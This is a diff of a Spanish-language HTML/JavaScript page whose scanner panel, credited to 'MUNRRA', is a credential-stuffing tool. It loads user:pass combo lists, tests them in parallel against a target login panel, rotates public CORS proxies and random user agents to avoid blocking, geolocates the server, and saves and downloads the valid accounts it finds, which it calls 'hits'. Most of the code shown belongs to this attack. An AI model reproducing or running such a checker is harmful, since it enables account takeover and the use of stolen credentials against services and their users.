@@ -967,66 +967,78 @@
             </div>
         </div>
 
-        <!-- PANEL SCANNER (con lógica original de MUNRRA corregida) -->
+        <!-- ========== PANEL SCANNER (código HTML exacto de MUNRRA) ========== -->
         <div id="panel-scanner" class="panel">
+            <!-- Este es el HTML del escáner MUNRRA, con los mismos IDs que usa su script -->
             <div class="form-group">
-                <label>Panel (Host con o sin http/https):</label>
-                <input type="text" id="hostInput" placeholder="ej: lista.com:8080" />
+                <label id="lblHost">Panel (host con o sin http/https):</label>
+                <input type="text" id="hostInput" placeholder="ej: lista.com:8080" autocomplete="off" />
             </div>
+
             <div class="form-group">
-                <label>Selecciona tus archivos de Combos (.txt):</label>
+                <label id="lblCombo">Elige archivo .txt con combos (user:pass):</label>
                 <input type="file" id="comboFile1" accept=".txt" style="margin-bottom:6px;" />
                 <input type="file" id="comboFile2" accept=".txt" style="margin-bottom:6px;" />
                 <input type="file" id="comboFile3" accept=".txt" />
             </div>
-            <div class="form-group">
-                <label>...o pega tus combos aquí (user:pass):</label>
-                <textarea id="comboText" rows="4" placeholder="Usuario1:Contraseña1"></textarea>
-            </div>
-            <div class="form-group">
-                <label>Número de conexiones paralelas (bots):</label>
-                <input type="number" id="concurrencyInput" value="80" min="1" max="100" />
-            </div>
-            <div class="checkbox-row" style="display:flex; gap:15px; margin-bottom:15px;">
-                <label><input type="checkbox" id="useCors" checked> Proxy CORS</label>
-                <label><input type="checkbox" id="soundToggle" checked> 🔔 Sonido de Gemido</label>
-                <label><input type="checkbox" id="autoDownload" checked> ⬇️ Auto-Descarga</label>
-            </div>
-            <button id="startBtn" class="btn-block btn-start" disabled>INICIAR SCAN MULTI-JOB</button>
-            <button id="stopBtn" class="btn-block btn-stop" disabled>DETENER SCAN</button>
-            <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR TODO EN TELÉFONO (.TXT)</button>
 
-            <div class="job-card">
-                <div class="job-header">
-                    <span>Trabajo de Análisis 1</span>
-                    <span id="hitsCount1">Hits: <span class="yellow-hit">0</span></span>
+            <div class="form-group">
+                <label id="lblComboText">…o pegar combos (texto libre)</label>
+                <textarea id="comboText" rows="6" placeholder="Paste any text here; user:pass is automatically detected (one per line or in the middle of a line)."></textarea>
+            </div>
+
+            <div class="form-group">
+                <label id="lblConc">Número de conexiones paralelas (bots):</label>
+                <input type="number" id="concurrencyInput" min="1" max="100" value="80" />
+            </div>
+
+            <div class="opts" style="display:flex; flex-direction:column; gap:6px; margin:8px 0 2px;">
+                <div class="cors-row" style="display:flex; align-items:center; gap:8px; margin-top:10px;">
+                    <label><input type="checkbox" id="useCors" checked /> <span id="lblUseCors">Usar proxy CORS</span></label>
+                </div>
+                <div class="cors-row" style="display:flex; align-items:center; gap:8px; margin-top:10px;">
+                    <label><input type="checkbox" id="soundToggle" checked /> <span id="lblSound">🔔 Sonido al encontrar hit</span></label>
+                </div>
+                <div class="cors-row" style="display:flex; align-items:center; gap:8px; margin-top:10px;">
+                    <label><input type="checkbox" id="autoDownload" checked /> <span id="lblAutoDL">⬇️ Descargar resultados al finalizar</span></label>
+                </div>
+            </div>
+
+            <button id="startBtn" disabled>Iniciar Scan</button>
+            <button id="stopBtn" disabled>Detener Scan</button>
+            <button id="saveBtn" disabled>Guardar en el teléfono (.txt)</button>
+
+            <!-- === Barra Job 1 === -->
+            <div id="progressContainer">
+                <div class="jobTop" style="display:flex; align-items:center; justify-content:flex-start; margin-bottom:8px;">
+                    <div id="hitsCount1" class="hitsCount" style="font-weight:700; background:var(--fuego-grad); -webkit-background-clip:text; background-clip:text; color:transparent; font-size:0.95rem;">Hits encontrados: <span class="yellow-hit">0</span></div>
                 </div>
                 <div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div>
-                <div id="progressText" class="job-status">Procesados: 0 / 0</div>
+                <div id="progressText" class="job-status">Esperando inicio...</div>
                 <div id="currentCombo" class="job-user">Usuario actual: -</div>
             </div>
 
-            <div class="job-card">
-                <div class="job-header">
-                    <span>Trabajo de Análisis 2</span>
-                    <span id="hitsCount2">Hits: <span class="yellow-hit">0</span></span>
+            <!-- === Barra Job 2 === -->
+            <div id="progressContainer2">
+                <div class="jobTop" style="display:flex; align-items:center; justify-content:flex-start; margin-bottom:8px;">
+                    <div id="hitsCount2" class="hitsCount" style="font-weight:700; background:var(--fuego-grad); -webkit-background-clip:text; background-clip:text; color:transparent; font-size:0.95rem;">Hits encontrados: <span class="yellow-hit">0</span></div>
                 </div>
                 <div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div>
-                <div id="progressText2" class="job-status">Procesados: 0 / 0</div>
+                <div id="progressText2" class="job-status">Esperando inicio...</div>
                 <div id="currentCombo2" class="job-user">Usuario actual: -</div>
             </div>
 
-            <div class="job-card">
-                <div class="job-header">
-                    <span>Trabajo de Análisis 3</span>
-                    <span id="hitsCount3">Hits: <span class="yellow-hit">0</span></span>
+            <!-- === Barra Job 3 === -->
+            <div id="progressContainer3">
+                <div class="jobTop" style="display:flex; align-items:center; justify-content:flex-start; margin-bottom:8px;">
+                    <div id="hitsCount3" class="hitsCount" style="font-weight:700; background:var(--fuego-grad); -webkit-background-clip:text; background-clip:text; color:transparent; font-size:0.95rem;">Hits encontrados: <span class="yellow-hit">0</span></div>
                 </div>
                 <div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div>
-                <div id="progressText3" class="job-status">Procesados: 0 / 0</div>
+                <div id="progressText3" class="job-status">Esperando inicio...</div>
                 <div id="currentCombo3" class="job-user">Usuario actual: -</div>
             </div>
 
-            <div class="results-title">Resultados del Escaneo Actual:</div>
+            <div class="results-title" style="color:#ff6644; font-size:1.2rem; margin-top:20px; margin-bottom:10px; font-weight:bold; text-shadow:0 0 6px #ff2200;">Resultados del Escaneo Actual:</div>
             <div id="hitsContainer"></div>
         </div>
 
@@ -1474,7 +1486,7 @@
             localStorage.setItem('sys_urls', JSON.stringify(baseUrls));
             renderizarUrlsBloc(); }
 
-        // BANCO HITS
+        // ========== BANCO HITS ==========
         function guardarHitEnBanco(hitTexto, user, pass) {
             try {
                 const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits')) || {};
@@ -1776,25 +1788,10 @@
         });
 
         // ======================================================================
-        // ========== ESCÁNER (código original de MUNRRA, corregido) ==========
+        // ========== ESCÁNER MUNRRA (CÓDIGO COMPLETO Y ORIGINAL) ==========
         // ======================================================================
 
-        // ---- Normalización del host ----
-        function normalizarHost(hostRaw) {
-            // Eliminar http:// o https://
-            let h = hostRaw.replace(/^https?:\/\//, '').trim();
-            // Si tiene una barra en lugar de dos puntos, convertirla a dos puntos
-            if (h.includes('/') && !h.includes(':')) {
-                h = h.replace('/', ':');
-            }
-            // Si no tiene puerto, agregar :80
-            if (!h.includes(':')) {
-                h = h + ':80';
-            }
-            return h;
-        }
-
-        // ---- Textos fijos en español (igual que en MUNRRA) ----
+        // ------------------- i18n (igual que en MUNRRA) -------------------
         const i18n = {
             es: {
                 hostLabel: "Panel (host con o sin http/https):",
@@ -1840,13 +1837,13 @@
                 more: "más"
             }
         };
-        const LANG = 'es';
+        let LANG = 'es';
 
         function t(key) {
             return (i18n[LANG] && i18n[LANG][key]) ?? key;
         }
 
-        // ---- Utilidades ----
+        // ------------------- Utilidades MUNRRA -------------------
         function randomUA() {
             const uas = [
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
@@ -1877,7 +1874,7 @@
             return opts;
         }
 
-        // ---- Fetch con timeout (7 segundos como en MUNRRA) ----
+        // ------------------- Fetch con timeout (7s) -------------------
         async function fetchTimeout(url, opts = {}, ms = 7000) {
             const controller = new AbortController();
             const id = setTimeout(() => { controller.abort(); }, ms);
@@ -1891,7 +1888,7 @@
             }
         }
 
-        // ---- Proxies CORS con circuit breaker (lista original de MUNRRA) ----
+        // ------------------- Proxies CORS (MUNRRA) -------------------
         const CORS_PROXIES = [
             'https://cors.isomorphic-git.org/{url}',
             'https://thingproxy.freeboard.io/fetch/{url}',
@@ -1926,11 +1923,9 @@
             PROXY_FAILS.delete(tpl);
         }
 
-        // ---- Función fetchWithCors exacta de MUNRRA ----
         async function fetchWithCors(url, options = {}, jobId = null) {
             const baseOpts = { cache: 'no-store', keepalive: false, ...options };
 
-            // 1) Proxy fijo del job
             if (jobId && JOB_PROXIES[jobId]) {
                 const fixedTpl = JOB_PROXIES[jobId];
                 if (!proxyIsCold(fixedTpl)) {
@@ -1943,7 +1938,6 @@
                 }
             }
 
-            // 2) Intento directo
             try {
                 const r = await fetchTimeout(url, baseOpts);
                 if (r && r.ok) return r;
@@ -1951,7 +1945,6 @@
                 if (!document.getElementById('useCors').checked) throw e;
             }
 
-            // 3) Rotación por los demás proxies
             const pool = CORS_PROXIES.filter(tpl => {
                 if (jobId && JOB_PROXIES[jobId] === tpl) return false;
                 return !proxyIsCold(tpl);
@@ -1973,7 +1966,7 @@
             return await r.json();
         }
 
-        // ---- Geo ----
+        // ------------------- Geo -------------------
         async function resolveIP(domain) {
             try {
                 const clean = domain.split(':')[0];
@@ -2000,7 +1993,7 @@
             return cc.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt()));
         }
 
-        // ---- Categorías ----
+        // ------------------- Categorías -------------------
         function summarizeCategories(cats, limit = 40) {
             if (!Array.isArray(cats) || !cats.length) return `${t('categoriesRule')}\n• ${t('none')}`;
             const names = cats.map(c => c.category_name || c.name || '').filter(Boolean);
@@ -2011,7 +2004,7 @@
             return `${t('categoriesRule')}\n${lines.join('\n')}`;
         }
 
-        // ---- Extraer combo de línea (permisivo) ----
+        // ------------------- Extraer combo (MUNRRA) -------------------
         function extractCombo(line) {
             if (!line) return null;
             let s = String(line).normalize('NFKC').replace(/\s+/g, ' ').trim();
@@ -2023,7 +2016,7 @@
             return [user, pass];
         }
 
-        // ---- Variables globales del escáner ----
+        // ------------------- Variables globales escáner -------------------
         let isRunning = false;
         let stopRequested = false;
         let serverIP = null,
@@ -2035,7 +2028,7 @@
         const HITS = { 1: [], 2: [], 3: [] };
         let JOB_PROXIES = {};
 
-        // ---- UI helpers ----
+        // ------------------- UI helpers -------------------
         function uiFor(job) {
             if (job === 1) return {
                 fill: document.getElementById('progressBarFill'),
@@ -2070,57 +2063,63 @@
                 `${t('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
         }
 
-        // ---- Mostrar hit (con try-catch para evitar que falle el sonido o el guardado) ----
+        // ------------------- Mostrar hit (MUNRRA original) -------------------
         function mostrarHit(hit, ui) {
-            // 1. Crear y mostrar el bloque HTML (si falla esto, no hay nada que hacer)
-            try {
-                const div = document.createElement('div');
-                div.className = 'hit-block';
-                const header = document.createElement('div');
-                header.className = 'hit-header';
-                header.textContent = `${t('user')}: ${hit.user} | ${t('pass')}: ${hit.pass}`;
-                const content = document.createElement('pre');
-                content.className = 'hit-content';
-                content.textContent = hit.texto;
-                div.appendChild(header);
-                div.appendChild(content);
+            const div = document.createElement('div');
+            div.className = 'hit-block';
 
-                const hitsContainer = document.getElementById('hitsContainer');
-                if (hitsContainer) hitsContainer.prepend(div);
-            } catch (e) {
-                console.error("Error mostrando el bloque del hit:", e);
+            const header = document.createElement('div');
+            header.className = 'hit-header';
+            header.textContent = `${t('user')}: ${hit.user} | ${t('pass')}: ${hit.pass}`;
+
+            const content = document.createElement('pre');
+            content.className = 'hit-content';
+            content.textContent = hit.texto;
+
+            div.appendChild(header);
+            div.appendChild(content);
+
+            document.getElementById('hitsContainer').prepend(div);
+
+            if (ui.hitsCountEl) {
+                ui.hitsCountEl.innerHTML =
+                    `${t('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
             }
 
-            // 2. Actualizar el contador del job (crítico)
-            try {
-                if (ui && ui.hitsCountEl) {
-                    ui.hitsCountEl.innerHTML =
-                        `${t('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
-                }
-            } catch (e) {
-                console.error("Error actualizando contador:", e);
-            }
-
-            // 3. Reproducir sonido (no crítico, si falla no importa)
-            try {
+            // Sonido MUNRRA (si existe la función, la llamamos; si no, la creamos)
+            if (typeof playMoanSound === 'function') {
+                playMoanSound();
+            } else {
+                // Si no está definida, la definimos aquí mismo
                 if (document.getElementById('soundToggle') && document.getElementById('soundToggle').checked) {
-                    if (typeof playMoanSound === 'function') playMoanSound();
+                    try {
+                        const audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+                        if (audioCtx.state === 'suspended') audioCtx.resume();
+                        const now = audioCtx.currentTime;
+                        const osc = audioCtx.createOscillator();
+                        const gain = audioCtx.createGain();
+                        osc.connect(gain);
+                        gain.connect(audioCtx.destination);
+                        osc.type = 'sine';
+                        osc.frequency.setValueAtTime(400, now);
+                        osc.frequency.exponentialRampToValueAtTime(800, now + 0.15);
+                        osc.frequency.exponentialRampToValueAtTime(300, now + 0.35);
+                        gain.gain.setValueAtTime(0.3, now);
+                        gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
+                        osc.start();
+                        osc.stop(now + 0.8);
+                        if (navigator.vibrate) navigator.vibrate(200);
+                    } catch (e) { console.log("Audio error", e); }
                 }
-            } catch (e) {
-                console.error("Error reproduciendo sonido:", e);
             }
 
-            // 4. Guardar en el banco de hits (no crítico, si falla no importa)
-            try {
-                if (typeof guardarHitEnBanco === 'function') {
-                    guardarHitEnBanco(hit.texto, hit.user, hit.pass);
-                }
-            } catch (e) {
-                console.error("Error guardando en banco:", e);
+            // Guardar en banco (si existe la función)
+            if (typeof guardarHitEnBanco === 'function') {
+                guardarHitEnBanco(hit.texto, hit.user, hit.pass);
             }
         }
 
-        // ---- Validar combo (exactamente igual a MUNRRA) ----
+        // ------------------- Validar combo (MUNRRA original) -------------------
         async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null) {
             try {
                 if (stopRequested) return null;
@@ -2195,7 +2194,7 @@ ${t('groupsB')}`;
             } catch { return null; }
         }
 
-        // ---- Procesar un job (lista de combos) ----
+        // ------------------- Procesar un job (MUNRRA original) -------------------
         async function processarCombosJob(host, combos, conc, jobId) {
             const ui = uiFor(jobId);
             ui.hitsArr.length = 0;
@@ -2251,7 +2250,7 @@ ${t('groupsB')}`;
             if (ui.text) ui.text.textContent += (stopRequested ? t('scanStopped') : t('scanDone'));
         }
 
-        // ---- Guardar resultados (funciones auxiliares) ----
+        // ------------------- Guardar resultados (MUNRRA) -------------------
         function dedupeHits(arr) {
             const seen = new Set();
             const out = [];
@@ -2320,7 +2319,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             a.remove();
         }
 
-        // ---- Cargar archivos de combos ----
+        // ------------------- Cargar archivos -------------------
         function readTxtFile(inputEl, targetArray) {
             targetArray.length = 0;
             const f = inputEl.files?.[0];
@@ -2337,14 +2336,13 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             r.readAsText(f);
         }
 
-        // ---- Estado del botón Start ----
         function updateStartState() {
             const hasHost = !!document.getElementById('hostInput').value.trim();
             const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
             document.getElementById('startBtn').disabled = !(hasHost && hasAnyCombos);
         }
 
-        // ---- Event listeners del escáner ----
+        // ------------------- Event listeners -------------------
         document.getElementById('comboFile1').addEventListener('change', () => readTxtFile(document.getElementById(
             'comboFile1'), combos1));
         document.getElementById('comboFile2').addEventListener('change', () => readTxtFile(document.getElementById(
@@ -2367,18 +2365,16 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
 
         document.getElementById('hostInput').addEventListener('input', updateStartState);
 
-        // ---- Botón START (con normalización del host) ----
+        // ------------------- Botón START (MUNRRA original) -------------------
         document.getElementById('startBtn').addEventListener('click', async () => {
             if (isRunning) return;
 
-            // Resetear UI
             isRunning = true;
             stopRequested = false;
             document.getElementById('startBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
             document.getElementById('saveBtn').disabled = true;
 
-            // Limpiar hits container
             const hitsContainer = document.getElementById('hitsContainer');
             if (hitsContainer) hitsContainer.textContent = '';
             [document.getElementById('hitsCount1'), document.getElementById('hitsCount2'), document.getElementById(
@@ -2387,7 +2383,6 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             });
             Object.values(HITS).forEach(arr => arr.length = 0);
 
-            // Limpiar barras
             ['progressBarFill', 'progressBarFill2', 'progressBarFill3'].forEach(id => {
                 const el = document.getElementById(id);
                 if (el) el.style.width = '0%';
@@ -2401,26 +2396,18 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
                 if (el) el.textContent = `${t('currentUser')}: -`;
             });
 
-            // === NORMALIZAR EL HOST ===
-            const rawHost = document.getElementById('hostInput').value.trim();
-            const host = normalizarHost(rawHost);
-            // Actualizar el input con el formato corregido (opcional)
-            document.getElementById('hostInput').value = host;
-
+            const host = document.getElementById('hostInput').value.replace(/^https?:\/\//, '').trim();
             const baseConc = parseInt(document.getElementById('concurrencyInput').value) || 80;
 
-            // Obtener IP y Geo
             serverIP = await resolveIP(host);
             serverGeo = serverIP ? await fetchGeo(serverIP) : null;
 
-            // Si hay combos en el textarea, añadirlos al job1
             if (combosTxt.length) {
                 combos1 = combos1.concat(combosTxt);
                 combosTxt = [];
                 document.getElementById('comboText').value = '';
             }
 
-            // Asignar proxies fijos por job (igual que MUNRRA)
             JOB_PROXIES = {};
             const shuffled = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
             const activeJobs = [combos1.length > 0, combos2.length > 0, combos3.length > 0].filter(Boolean).length || 1;
@@ -2443,14 +2430,12 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
                 return;
             }
 
-            // Esperar a que todos los jobs terminen
             Promise.allSettled(jobs).then(() => {
                 isRunning = false;
                 document.getElementById('stopBtn').disabled = true;
                 document.getElementById('startBtn').disabled = false;
                 document.getElementById('saveBtn').disabled = false;
 
-                // Auto-descarga
                 if (document.getElementById('autoDownload').checked) {
                     const totalHits = (HITS[1]?.length || 0) + (HITS[2]?.length || 0) + (HITS[3]?.length || 0);
                     if (totalHits > 0) {
@@ -2461,7 +2446,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             });
         });
 
-        // ---- Botón STOP ----
+        // ------------------- Botón STOP -------------------
         document.getElementById('stopBtn').addEventListener('click', () => {
             if (!isRunning) return;
             stopRequested = true;
@@ -2472,7 +2457,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             });
         });
 
-        // ---- Botón SAVE ----
+        // ------------------- Botón SAVE -------------------
         document.getElementById('saveBtn').addEventListener('click', () => {
             const host = document.getElementById('hostInput').value;
             if (!host) return;
@@ -2631,29 +2616,29 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
 
         function cargarMensajesChat() {}
 
-        // ---- Función de sonido (usada por el escáner) ----
-        let moanAudioContext = null;
-
-        function playMoanSound() {
-            if (!document.getElementById('soundToggle').checked) return;
-            try {
-                if (!moanAudioContext) moanAudioContext = new(window.AudioContext || window.webkitAudioContext)();
-                if (moanAudioContext.state === 'suspended') moanAudioContext.resume();
-                const now = moanAudioContext.currentTime;
-                const osc = moanAudioContext.createOscillator();
-                const gain = moanAudioContext.createGain();
-                osc.connect(gain);
-                gain.connect(moanAudioContext.destination);
-                osc.type = 'sine';
-                osc.frequency.setValueAtTime(400, now);
-                osc.frequency.exponentialRampToValueAtTime(800, now + 0.15);
-                osc.frequency.exponentialRampToValueAtTime(300, now + 0.35);
-                gain.gain.setValueAtTime(0.3, now);
-                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
-                osc.start();
-                osc.stop(now + 0.8);
-                if (navigator.vibrate) navigator.vibrate(200);
-            } catch (e) { console.log("Audio error", e); }
+        // ---- Función de sonido global (por si no existe) ----
+        if (typeof playMoanSound !== 'function') {
+            window.playMoanSound = function() {
+                if (!document.getElementById('soundToggle') || !document.getElementById('soundToggle').checked) return;
+                try {
+                    const audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+                    if (audioCtx.state === 'suspended') audioCtx.resume();
+                    const now = audioCtx.currentTime;
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(400, now);
+                    osc.frequency.exponentialRampToValueAtTime(800, now + 0.15);
+                    osc.frequency.exponentialRampToValueAtTime(300, now + 0.35);
+                    gain.gain.setValueAtTime(0.3, now);
+                    gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
+                    osc.start();
+                    osc.stop(now + 0.8);
+                    if (navigator.vibrate) navigator.vibrate(200);
+                } catch (e) { console.log("Audio error", e); }
+            };
         }
     </script>
 
